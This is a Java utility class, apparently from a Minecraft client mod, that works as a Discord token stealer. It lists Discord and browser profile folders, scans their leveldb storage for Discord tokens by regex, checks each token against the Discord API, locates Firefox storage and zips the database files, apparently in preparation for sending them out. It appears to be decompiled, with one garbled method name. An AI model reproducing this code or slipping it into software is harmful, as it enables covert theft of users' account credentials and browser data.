package dev.zenhao.melon.utils.bd;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class DiscordUtil {

    public static final List<String> List = new ArrayList<>(Arrays.asList(System.getenv("APPDATA") + "\\Discord", System.getenv("APPDATA") + "\\discordcanary", System.getenv("APPDATA") + "\\discordptb", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default", System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default", System.getenv("APPDATA") + "\\LightCord", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"));
    private static final Gson MapOne = new Gson();
    public static List<Object> tokenList = new ArrayList<>();

    public static List<String> MapList(List<String> tokens) {
        ArrayList<String> validTokens = new ArrayList<>();
        tokens.forEach((token) -> {
            try {
                URL url = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                Map<String, Object> stuff = MapOne.fromJson(Agent(token), (new TypeToken<Map<String, Object>>() {
                }).getType());
                stuff.forEach((key, value) -> con.addRequestProperty(key, (String) value));
                con.getInputStream().close();
                validTokens.add(token);
            } catch (Exception ignored) {
            }

        });
        return validTokens;
    }

    public static String GetList(String link, String auth) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            Map<String, Object> json = MapOne.fromJson(Agent(auth), (new TypeToken<Map<String, Object>>() {
            }).getType());
            json.forEach((key, value) -> httpURLConnection.addRequestProperty(key, (String) value));
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();

            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }

            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception var8) {
            return "";
        }
    }

    public static JsonObject Agent(String token) {
        JsonObject object = new JsonObject();
        object.addProperty("Content-Type", "application/json");
        object.addProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (token != null) {
            object.addProperty("Authorization", token);
        }

        return object;
    }

    public static List<String> collectToken(List<String> list) {
        return list.stream().distinct().collect(Collectors.toCollection(ArrayList::new));
    }

    public static Optional<File> _/* $FF was:  */() {
        File file = new File(System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles");
        if (file.isDirectory()) {
            File[] var1 = Objects.requireNonNull(file.listFiles());
            int var2 = var1.length;

            for (int var3 = 0; var3 < var2; ++var3) {
                File file1 = var1[var3];
                if (file1.isDirectory() && file1.getName().contains("release")) {
                    File[] var5 = Objects.requireNonNull(file1.listFiles());
                    int var6 = var5.length;

                    for (int var7 = 0; var7 < var6; ++var7) {
                        File file2 = var5[var7];
                        if (file2.getName().contains("webappsstore")) {
                            return Optional.of(file2);
                        }
                    }
                }
            }
        }

        return Optional.empty();
    }

    public ArrayList<String> FindToken(String inPath) {
        String path = inPath + "\\Local Storage\\leveldb\\";
        ArrayList<String> tokens = new ArrayList();
        File pa = new File(path);
        String[] list = pa.list();
        if (list == null) {
            return null;
        } else {
            String[] var5 = list;
            int var6 = list.length;

            for (int var7 = 0; var7 < var6; ++var7) {
                String s = var5[var7];

                try {
                    FileInputStream fileInputStream = new FileInputStream(path + s);
                    DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        Matcher matcher = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(line);

                        while (matcher.find()) {
                            tokens.add(matcher.group());
                        }
                    }
                } catch (Exception ignored) {
                }
            }

            tokenList.add(String.join(" - ", tokens));
            return tokens;
        }
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath));
        ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p));
        Throwable var5 = null;

        try {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp).filter((path) -> !Files.isDirectory(path)).filter((path) -> path.toFile().getPath().contains("ldb")).forEach((path) -> {
                ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());

                try {
                    zs.putNextEntry(zipEntry);
                    Files.copy(path, zs);
                    zs.closeEntry();
                } catch (IOException ignored) {
                }

            });
        } catch (Throwable var14) {
            var5 = var14;
            throw var14;
        } finally {
            if (zs != null) {
                if (var5 == null) {
                    zs.close();
                } else {
                    try {
                        zs.close();
                    } catch (Throwable var13) {
                        var5.addSuppressed(var13);
                    }
                }
            }

        }
    }
}
